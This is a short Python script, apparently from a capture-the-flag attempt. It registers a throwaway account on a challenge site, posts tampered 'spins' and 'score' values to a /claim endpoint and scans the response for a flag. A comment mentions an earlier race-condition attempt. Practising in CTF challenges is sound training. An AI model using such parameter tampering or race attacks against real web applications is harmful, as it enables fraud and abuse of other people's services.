import requests, random, string

base = 'https://web-random-cheese.tracebash.xyz'

# Create fresh user
s = requests.Session()
name = ''.join(random.choices(string.ascii_lowercase, k=8))
s.post(f'{base}/register', data={'username': name, 'password': name})
s.post(f'{base}/login', data={'username': name, 'password': name})

# Try claim with spins=10&score=100 as data params (not json)
r = s.post(f'{base}/claim', data={'spins': '10', 'score': '100'})
print('With data params - Status:', r.status_code)
print(r.text[1500:2500].encode('ascii', errors='replace').decode('ascii'))

# The earlier race output had "FLAG FOUND!" which means the text DID contain flag
# but encoding failed. Let me write to a file instead
text = r.text
with open('output.html', 'w', encoding='utf-8') as f:
    f.write(text)
    
# Search for flag pattern
import re
matches = re.findall(r'[A-Za-z0-9_\{\}]{10,}', text)
for m in matches:
    if 'flag' in m.lower() or 'ctf' in m.lower() or '{' in m:
        print('Possible flag:', repr(m))